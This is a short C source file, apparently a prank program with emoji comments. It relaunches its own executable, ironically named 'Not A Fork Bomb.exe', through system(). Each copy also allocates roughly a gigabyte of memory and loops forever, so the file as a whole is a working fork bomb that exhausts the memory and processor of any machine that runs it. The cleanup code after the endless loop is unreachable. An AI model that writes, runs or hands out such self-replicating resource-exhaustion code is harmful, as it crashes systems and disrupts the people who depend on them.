#include <stdio.h>
#include <stdlib.h>
#include <time.h>

// 🔢
#define SOME_FUCKING_NUMBER 250000000

int main(int argc, char** argv)
{
    // 🌱🌱 seed random 🌱🌱
    srand(time(NULL));

    // open another instance of 🚫🍴💣
    system("\"Not A Fork Bomb.exe\"");

    // 💥💥💥💻💥💥💥
    int* BIGINT = malloc(sizeof(int) * SOME_FUCKING_NUMBER);

    // fill er up 📧📧📧📧📧📧📧
    for(int i = 0; i < SOME_FUCKING_NUMBER; i++)
        BIGINT[i] = rand();

    // sit forever 🪑 and do some maths i guess 👩‍🔬➕➕🔢
    while(1)
        for(int i = 0; i < SOME_FUCKING_NUMBER; i++)
            BIGINT[i]++;

    // free memory, i swear 🙂
    free(BIGINT);

    // end the program, i swear 🙂
    return 0;
}